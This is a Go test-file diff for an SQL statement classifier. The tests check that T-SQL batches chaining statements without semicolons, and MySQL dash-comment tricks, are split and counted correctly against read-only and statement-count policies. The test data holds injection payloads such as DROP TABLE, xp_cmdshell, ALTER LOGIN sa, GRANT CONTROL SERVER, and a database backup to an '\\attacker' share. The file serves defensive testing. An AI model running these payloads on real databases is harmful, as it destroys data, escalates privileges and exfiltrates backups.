@@ -528,3 +528,165 @@ func TestClipCutsOnARuneBoundary(t *testing.T) {
 		t.Fatalf("Clip produced a replacement character: %q", got)
 	}
 }
+
+// A T-SQL batch separates statements with whitespace, so a reader that divided
+// on semicolons alone saw one statement where the server sees two.
+//
+// This is the whole policy, bypassed by a space. `PRINT 'ok' DROP TABLE users`
+// was classified by its leading PRINT as a non-writing select, which read_only
+// permits and an allow-list of `select` permits, and the batch was forwarded
+// verbatim for SQL Server to run both halves. The same space defeated
+// max_statements, which counted separators the dialect does not require.
+func TestAJuxtaposedTSQLStatementIsItsOwnStatement(t *testing.T) {
+	for _, tc := range []struct {
+		sql  string
+		want []Kind
+	}{
+		{"PRINT 'ok' DROP TABLE users", []Kind{KindSelect, KindDDL}},
+		{"SET NOCOUNT ON EXEC xp_cmdshell 'whoami'", []Kind{KindSet, KindCall}},
+		{"SELECT 1 DELETE FROM audit", []Kind{KindSelect, KindDelete}},
+		{"SELECT 1 UPDATE t SET x = 2", []Kind{KindSelect, KindUpdate}},
+		{"SELECT 1 MERGE t USING s ON t.k = s.k WHEN MATCHED THEN DELETE",
+			[]Kind{KindSelect, KindMerge, KindDelete}},
+		{"GO ALTER LOGIN sa WITH PASSWORD = 'x'", []Kind{KindEmpty, KindDDL}},
+		{"SELECT 1 GRANT CONTROL SERVER TO victim", []Kind{KindSelect, KindGrant}},
+		{"SELECT 1 BACKUP DATABASE d TO DISK = '\\\\attacker\\s\\d.bak'",
+			[]Kind{KindSelect, KindMaintenance}},
+		{"SELECT 1 WAITFOR DELAY '00:00:10'", []Kind{KindSelect, KindMaintenance}},
+		{"SELECT 1 RECONFIGURE", []Kind{KindSelect, KindUnknown}},
+		// The cover may itself be behind a semicolon, and the hidden statement
+		// is found in whichever part holds it.
+		{"SELECT 1; PRINT 'ok' TRUNCATE TABLE audit",
+			[]Kind{KindSelect, KindSelect, KindDDL}},
+	} {
+		got, ok := Statements(TSQL, tc.sql, 0)
+		if !ok {
+			t.Errorf("%q: not lexed", tc.sql)
+			continue
+		}
+		if len(got) != len(tc.want) {
+			t.Errorf("%q: %d statements %+v, want %d", tc.sql, len(got), got, len(tc.want))
+			continue
+		}
+		for i, w := range tc.want {
+			if got[i].Kind != w {
+				t.Errorf("%q: statement %d is %s, want %s", tc.sql, i, got[i].Kind, w)
+			}
+		}
+		// Whatever the kinds, the hidden statement has to read as a write, or
+		// read_only is still decorative.
+		if !got[len(got)-1].Writes {
+			t.Errorf("%q: the hidden statement does not count as a write: %+v",
+				tc.sql, got[len(got)-1])
+		}
+	}
+}
+
+// The bound counts statements, not semicolons: a batch that hides a second
+// statement behind the first has two, and a policy that allows one refuses it.
+func TestTheStatementBoundCountsAJuxtaposedStatement(t *testing.T) {
+	if _, ok := Statements(TSQL, "PRINT 'ok' DROP TABLE users", 1); ok {
+		t.Error("two statements passed a bound of one")
+	}
+	if _, ok := Statements(TSQL, "PRINT 'ok'", 1); !ok {
+		t.Error("one statement did not pass a bound of one")
+	}
+}
+
+// The scan is narrow on purpose. Every line here is ordinary T-SQL, and a
+// classifier that reported a second statement in any of them would refuse
+// working queries -- which is how a security control gets switched off.
+func TestOrdinaryTSQLHoldsOneStatement(t *testing.T) {
+	for _, sql := range []string{
+		"SELECT * FROM orders WHERE id = 1",
+		"SELECT [drop], [exec] FROM t",
+		"SELECT 'DROP TABLE users' AS warning",
+		"SELECT \"delete\" FROM t",
+		"SELECT * FROM t WHERE note = 'please truncate the log'",
+		"SELECT * FROM t WITH (UPDLOCK) WHERE k = 1",
+		"SELECT * FROM t FOR UPDATE",
+		"SET TRANSACTION ISOLATION LEVEL READ COMMITTED",
+		"SET @total = (SELECT COUNT(*) FROM orders)",
+		"SET IDENTITY_INSERT dbo.t ON",
+		// A lead outside the covers is a writing kind already, and its own
+		// syntax holds the keywords the scan looks for.
+		"ALTER TABLE t DROP COLUMN c",
+		"CREATE PROCEDURE p AS INSERT INTO t VALUES (1)",
+		"INSERT INTO t SELECT * FROM u",
+		"GRANT SELECT ON t TO r WITH GRANT OPTION",
+		"UPDATE t SET x = 1 WHERE k = 2",
+		"TRUNCATE TABLE t",
+		"MERGE t USING s ON t.k = s.k WHEN MATCHED THEN UPDATE SET t.v = s.v",
+	} {
+		got, ok := Statements(TSQL, sql, 0)
+		if !ok {
+			t.Errorf("%q: not lexed", sql)
+			continue
+		}
+		if len(got) != 1 {
+			t.Errorf("%q: %d statements %+v, want 1", sql, len(got), got)
+		}
+	}
+}
+
+// The scan belongs to the one dialect that needs no terminator. On the others a
+// statement is what the semicolons said it was, and a word that looks like a
+// keyword is a column name the server resolves -- reporting it as a statement
+// there would refuse queries without closing anything.
+func TestJuxtapositionIsNotScannedOnTheOtherDialects(t *testing.T) {
+	for _, d := range []Dialect{PostgreSQL, MySQL} {
+		got, ok := Statements(d, "SELECT 1 DELETE FROM audit", 0)
+		if !ok || len(got) != 1 || got[0].Kind != KindSelect {
+			t.Errorf("%v: %v %+v, want one select", d, ok, got)
+		}
+	}
+}
+
+// MySQL needs whitespace after `--` for it to open a comment: the second dash
+// must be followed by whitespace or a control character, so `1--1` is arithmetic
+// and `--x` is two unary minuses.
+//
+// A reader that took a bare `--` as a comment where the server does not is a
+// reader that stops at the end of the line while the server carries on, so the
+// `;` and the statement behind it are invisible to the classifier and to
+// `max_statements` both.
+func TestTheDashCommentNeedsWhitespaceOnMySQLOnly(t *testing.T) {
+	// The server sees two statements here, so the relay must too.
+	for _, sql := range []string{
+		"SELECT 1--1; DROP TABLE t",
+		"SELECT 1--'x'; DROP TABLE t",
+	} {
+		got, ok := Statements(MySQL, sql, 0)
+		if !ok {
+			t.Errorf("%q: would not lex", sql)
+			continue
+		}
+		if len(got) != 2 || got[1].Kind != KindDDL {
+			t.Errorf("%q: %+v, want a select and a ddl", sql, got)
+		}
+		if _, ok := Statements(MySQL, sql, 1); ok {
+			t.Errorf("%q: two statements passed a bound of one", sql)
+		}
+	}
+	// With the whitespace it is a comment on every dialect, and what follows
+	// really is hidden from the server as well.
+	for _, d := range []Dialect{MySQL, PostgreSQL, TSQL} {
+		got, ok := Statements(d, "SELECT 1 -- ; DROP TABLE t", 0)
+		if !ok || len(got) != 1 || got[0].Kind != KindSelect {
+			t.Errorf("%v: %v %+v, want one select", d, ok, got)
+		}
+	}
+	// And the other two dialects take a bare `--` as a comment, because their
+	// servers do.
+	for _, d := range []Dialect{PostgreSQL, TSQL} {
+		got, ok := Statements(d, "SELECT 1--1; DROP TABLE t", 0)
+		if !ok || len(got) != 1 || got[0].Kind != KindSelect {
+			t.Errorf("%v: %v %+v, want one select", d, ok, got)
+		}
+	}
+	// Two dashes at the very end of the text comment over nothing, which must
+	// not be read as an unterminated anything.
+	if got, ok := Statements(MySQL, "SELECT 1 --", 0); !ok || len(got) != 1 {
+		t.Errorf("trailing dashes: %v %+v", ok, got)
+	}
+}
